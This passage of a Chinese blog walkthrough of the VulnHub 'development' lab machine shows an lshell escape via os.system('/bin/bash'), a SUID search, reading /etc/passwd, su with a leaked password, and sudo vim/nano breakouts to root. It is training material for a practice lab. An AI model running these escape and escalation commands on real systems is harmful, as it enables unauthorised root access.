+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo $SHELL<br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/28.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li><strong>原来是lshell，那就先逃逸一波吧</strong></li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<p><strong>lshell逃逸：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">有<span class="hljs-built_in">echo</span>逃逸的测试，这里需要与python搭配</span><br><br>echo os.system(&#x27;/bin/bash&#x27;)<br></code></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<p><strong>靶机内信息收集：</strong></p>
+<br/>
+
+<br/>
+
+
+
+<p><strong>查看local.txt文件：</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/29.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<p><strong>查看work.txt文件：</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/33.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li><strong>这里提到了<code>patrick</code>，以及密码策略，应该还没有更改</strong></li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>使用<code>find</code>寻找具有SUID权限的文件</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm -4000 -user root -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/34.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+
+
+<ul>
+<li><strong>发现有<code>sudo</code>和<code>su</code></strong></li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>那就再去看看sudo吧</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/35.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li><strong>sudo -l 不可用，那没办法了</strong></li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>查看&#x2F;etc&#x2F;passwd：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/passwd | grep /bin/bash<br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/36.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li><strong>这里还有两个用户，admin和patrick，去它们的home目录看看</strong></li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<p><strong>在patrick的目录下，找到password.txt文件，以为有密码泄露，结果没有信息</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/37.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<p><strong>提权：</strong></p>
+<p><strong>突然想起来，一开始网站不是泄露了密码了吗？试试那里的密码能不能用，不能ssh不代表我不能su啊</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/38.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<ul>
+<li><strong>这里是看到它是有lxd的，至于能不能用lxd提权，还没有去试过，因为有更简单的方法</strong></li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>sudo -l 查询</strong></p>
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/39.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li><strong>能无需密码执行vim和nano</strong></li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>什么？你告诉我不会用，不知道是干什么的，不会那不会查吗？</strong></p>
+<p><strong>访问网站<code>https://gtfobins.github.io/</code>查看用法</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">vim</span><br>sudo vim -c &#x27;:!/bin/bash&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">nano</span><br>sudo nano<br>^R^X<br>reset; sh 1&gt;&amp;0 2&gt;&amp;0<br></code></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/40.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<img src="/2025/05/29/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%A4%A9%E4%B9%8Bvulnhub-development/41.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a><strong>总结:</strong></h2><p>该靶机有以下值得思考：</p>
+<ul>
+<li><p>对于网站，可能存在注释设计者忘记删除，往往会暴露敏感信息</p>
+</li>
+<li><p>对于网站的链接，功能等，都需要进行测试</p>
+</li>
+<li><p>对于网站的漏洞，不要只盯着CMS，一些语言函数也可能是有漏洞的</p>
+</li>
+<li><p>对于ssh无法登录时，不代表su无法切换，密码都是一样的，但是ssh可能做了限制</p>
+</li>
+<li><p>对于提权，这里采用sudo提权的方式</p>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%8E%9F%E5%88%9B/" class="print-no-link">#原创</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>励志学习第四天之vulnhub-development</div>
+      <div>http://example.com/2025/05/29/励志学习第四天之vulnhub-development/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Achernar</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/28/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9%E4%B9%8Bvulnhub-snakeoil/" title="励志学习第三天之vulnhub-snakeoil">
+                        <span class="hidden-mobile">励志学习第三天之vulnhub-snakeoil</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"Nlnb8Qk84Y149g92eAYi98fl-gzGzoHsz","appKey":"4Bb0mDjXB8MftPeL9yNfjBgO","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量
+        <span id="busuanzi_value_site_pv"></span>
+        次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数
+        <span id="busuanzi_value_site_uv"></span>
+        人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
